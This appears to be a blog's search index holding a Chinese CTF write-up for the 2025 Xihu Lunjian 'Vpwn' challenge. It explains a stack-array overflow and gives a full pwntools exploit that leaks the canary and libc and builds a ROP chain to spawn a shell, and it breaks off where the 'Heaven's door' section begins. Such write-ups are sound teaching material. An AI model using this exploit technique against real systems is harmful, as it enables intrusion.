<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2025西湖论剑wp-部分pwn和IOT</title>
      <link href="/2025/01/20/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp-%E9%83%A8%E5%88%86pwn%E5%92%8CIOT/"/>
      <url>/2025/01/20/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp-%E9%83%A8%E5%88%86pwn%E5%92%8CIOT/</url>
      
        <content type="html"><![CDATA[<p>诚挚感谢复现平台：<a class="link" href="https://gz.imxbt.cn/">https://gz.imxbt.cn/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h1 id="Vpwn"><a href="#Vpwn" class="headerlink" title="Vpwn"></a>Vpwn</h1><p>一个简单的C++ pwn，用数组模拟栈的功能，但是存在溢出和任意修改。</p><ul><li>先看一下主代码：</li></ul><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> choice; <span class="comment">// [rsp+8h] [rbp-68h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+Ch] [rbp-64h] BYREF</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line">  _BYTE v8[<span class="number">40</span>]; <span class="comment">// [rsp+30h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stderr, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">sub_1840</span>((__int64)v8);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;\nMenu:\n&quot;</span>);</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;1. Edit an element in the vector\n&quot;</span>);</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;2. Push a new element\n&quot;</span>);</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;3. Pop the last element\n&quot;</span>);</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;4. Print vector\n&quot;</span>);</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;5. Exit\n&quot;</span>);</span><br><span class="line">    std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Enter your choice: &quot;</span>);</span><br><span class="line">    std::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;std::cin, &amp;choice);</span><br><span class="line">    <span class="keyword">switch</span> ( choice )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Enter the index to edit (0-based): &quot;</span>);</span><br><span class="line">        std::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;std::cin, &amp;v7);</span><br><span class="line">        std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Enter the new value: &quot;</span>);</span><br><span class="line">        std::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;std::cin, &amp;v6);</span><br><span class="line">        v3 = v6;</span><br><span class="line">        *(_DWORD *)<span class="built_in">check</span>(v8, v7) = v3;          <span class="comment">// 修改边界限制检查</span></span><br><span class="line">        std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Element updated successfully.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Enter the value to push: &quot;</span>);</span><br><span class="line">        std::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;std::cin, &amp;v7);</span><br><span class="line">        <span class="built_in">sub_18F4</span>(v8, &amp;v7);</span><br><span class="line">        std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Element pushed successfully.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">sub_1928</span>(v8);                           <span class="comment">// 仅将标志位设置为0</span></span><br><span class="line">        std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Last element popped successfully.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">sub_19BC</span>(v8);                           <span class="comment">// show</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Exiting program.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Invalid choice! Please enter a valid option.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>大概操作比较简单，给了一个菜单，我们可以push,pop,edit,show和exit功能，我们看看push是如何实现的：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_18F4</span><span class="params">(__int64 a1, <span class="type">int</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v2 = *a2;</span><br><span class="line">  result = *(_QWORD *)(a1 + <span class="number">24</span>);</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">24</span>) = result + <span class="number">1</span>;            <span class="comment">// 可溢出覆盖</span></span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">4</span> * result) = v2;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>通过将数据放进a1所指向地址的一个偏移处，并且在 +24的位置设置了一个数据的个数，那么此处是存在覆盖的，因为a1也就是主函数里面的v8这个字节数组，是存在与栈上的，由于”栈”空间是储存在 +24这个固定偏移的地方，也就是说我们可以往栈上多写几个数据就可以覆盖”栈空间”了，下面具体看一下：</p><h2 id="漏洞点调试"><a href="#漏洞点调试" class="headerlink" title="漏洞点调试"></a>漏洞点调试</h2><ul><li>先push四个数字：1，2，3，4看看栈上的数据：</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../image-20250120224301608.png" alt="image-20250120224301608"></p><ul><li>可以明显发现，我们push第七个数据就会覆盖”栈空间”，由于此题保护全开，我们需要泄露canary和libc，也就是我们至少要泄露rbp+8那里指向的一个可以算出libc_base的地址(本机libc版本不同，所以栈上数据不一致，实际上libc.so里面也没有__libc_start_call_main),因此我们可以假设覆盖“栈空间为20.</li><li>接着如何泄露canary和libc? 其实直接show就好了，我们打远程看看覆盖”栈空间”之后，show出来20个4字节的数据是什么(因为每个数据均是以unsigned int储存，输出也是，故为4字节)</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">push(<span class="number">1</span>)</span><br><span class="line">push(<span class="number">2</span>)</span><br><span class="line">push(<span class="number">3</span>)</span><br><span class="line">push(<span class="number">4</span>)</span><br><span class="line">push(<span class="number">5</span>)</span><br><span class="line">push(<span class="number">6</span>)</span><br><span class="line">push(<span class="number">20</span>) <span class="comment"># 造成溢出</span></span><br><span class="line"></span><br><span class="line">show() </span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../image-20250120225111355.png" alt="image-20250120225111355"></p><p>对照着之前动调的栈空间，可以得到 <code>20 0 0 0 </code>之后的数据便是canary，两部分都是canary，一个是高位，一个是地位，但是注意到数据有负数，要将其转化为无符号整数，即：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">0</span> :</span><br><span class="line">        n += <span class="number">0x100000000</span></span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄漏canary</span></span><br><span class="line">ru(<span class="string">&#x27;20 0 0 0 &#x27;</span>)</span><br><span class="line">canary_low = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>,drop=<span class="literal">True</span>))</span><br><span class="line">canary_high = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>,drop=<span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line">canary_low = check(canary_low) <span class="comment"># 处理出现负数即无符号溢出的情况</span></span><br><span class="line">canary_high = check(canary_high)</span><br><span class="line"></span><br><span class="line">canary = (canary_high &lt;&lt; <span class="number">32</span>) | canary_low</span><br></pre></td></tr></table></figure></div><p>同理，<code>0 0 0 0 2 0 </code>之后的数据便是可以泄露libc了，方法和canary是一致的：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">libc_low = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>,drop=<span class="literal">True</span>))</span><br><span class="line">libc_high = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>,drop=<span class="literal">True</span>))</span><br><span class="line">libc_low = check(libc_low)</span><br><span class="line">libc_high = check(libc_high)</span><br><span class="line"></span><br><span class="line">libc_base = (libc_high &lt;&lt; <span class="number">32</span>) | libc_low</span><br><span class="line">libc.address = libc_base - <span class="number">0x29d90</span> <span class="comment"># 这个数据估计要patchelf之后动调才知道，但是c++的文件我还不会patchelf，后续再补上</span></span><br></pre></td></tr></table></figure></div><ul><li>接下来就是布置rop链就行了，但是注意，我们要在ret_addr地方布置，由于此时“栈空间”是20，直接push的话不是在ret_addr，所以还需要先pop两个数据出来，再布置rop链即可，注意每次push仅为4字节，那么很明显了：</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi_ret = libc.address + <span class="number">0x000000000002a3e5</span></span><br><span class="line">ret = libc.address + <span class="number">0x0000000000029139</span></span><br><span class="line">bin_sh = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只需修改ret_addr即可，将“stack&quot;退到ret_addr</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    pop()</span><br><span class="line"></span><br><span class="line"><span class="comment">#构造rop链,get shell</span></span><br><span class="line">push(pop_rdi_ret &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">push((pop_rdi_ret &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span> )</span><br><span class="line"></span><br><span class="line">push(bin_sh &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">push((bin_sh &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span> )</span><br><span class="line"></span><br><span class="line">push(ret &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">push((ret &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span> )</span><br><span class="line"></span><br><span class="line">push(system &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">push((system &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span> )</span><br><span class="line"></span><br><span class="line">exit() <span class="comment">#布置完rop链需停止程序，让程序去执行rop链</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rc   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">ru  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">rl  = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">ia   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg= <span class="keyword">lambda</span> s, num   :p.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&quot;amd64&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">file = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc = <span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(file)</span></span><br><span class="line">p = remote(<span class="string">&quot;gz.imxbt.cn&quot;</span>,....)</span><br><span class="line">elf = ELF(file)</span><br><span class="line">libc = ELF(libc)</span><br><span class="line"><span class="comment">#p = remote(&quot;&quot;, 23583)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">0</span> :</span><br><span class="line">        n += <span class="number">0x100000000</span></span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&quot;Enter your choice: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,value</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;Enter the index to edit (0-based): &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;Enter the new value: &quot;</span>,<span class="built_in">str</span>(value))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push</span>(<span class="params">value</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;Enter the value to push: &quot;</span>,<span class="built_in">str</span>(value))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop</span>():</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    choice(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">push(<span class="number">1</span>)</span><br><span class="line">push(<span class="number">2</span>)</span><br><span class="line">push(<span class="number">3</span>)</span><br><span class="line">push(<span class="number">4</span>)</span><br><span class="line">push(<span class="number">5</span>)</span><br><span class="line">push(<span class="number">6</span>)</span><br><span class="line">push(<span class="number">20</span>) <span class="comment"># 造成溢出</span></span><br><span class="line"></span><br><span class="line">show() </span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄漏canary</span></span><br><span class="line">ru(<span class="string">&#x27;20 0 0 0 &#x27;</span>)</span><br><span class="line">canary_low = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>,drop=<span class="literal">True</span>))</span><br><span class="line">canary_high = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>,drop=<span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line">canary_low = check(canary_low) <span class="comment"># 处理出现负数即无符号溢出的情况</span></span><br><span class="line">canary_high = check(canary_high)</span><br><span class="line"></span><br><span class="line">canary = (canary_high &lt;&lt; <span class="number">32</span>) | canary_low</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;canary_high: &quot;</span>,canary_high)</span><br><span class="line">lg(<span class="string">&quot;canary_low: &quot;</span>,canary_low)</span><br><span class="line">lg(<span class="string">&quot;canary: &quot;</span>,canary)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄漏libc</span></span><br><span class="line">ru(<span class="string">&#x27;0 0 0 0 2 0 &#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_low = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>,drop=<span class="literal">True</span>))</span><br><span class="line">libc_high = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27; &#x27;</span>,drop=<span class="literal">True</span>))</span><br><span class="line">libc_low = check(libc_low)</span><br><span class="line">libc_high = check(libc_high)</span><br><span class="line"></span><br><span class="line">libc_base = (libc_high &lt;&lt; <span class="number">32</span>) | libc_low</span><br><span class="line">libc.address = libc_base - <span class="number">0x29d90</span></span><br><span class="line">lg(<span class="string">&quot;libc_address: &quot;</span>,libc.address)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc.address + <span class="number">0x000000000002a3e5</span></span><br><span class="line">ret = libc.address + <span class="number">0x0000000000029139</span></span><br><span class="line">bin_sh = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只需修改ret_addr即可，将“stack&quot;退到ret_addr</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    pop()</span><br><span class="line"></span><br><span class="line"><span class="comment">#构造rop链,get shell</span></span><br><span class="line">push(pop_rdi_ret &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">push((pop_rdi_ret &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span> )</span><br><span class="line"></span><br><span class="line">push(bin_sh &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">push((bin_sh &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span> )</span><br><span class="line"></span><br><span class="line">push(ret &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">push((ret &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span> )</span><br><span class="line"></span><br><span class="line">push(system &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">push((system &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span> )</span><br><span class="line"></span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h1 id="Heaven’s-door"><a href="#Heaven’s-door" class="headerlink" title="Heaven’s door"></a>Heaven’s door</h1><p>只允许两次syscal且开启sendbox的shellcode题目。</p><ul><li>先查看一下主函数</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 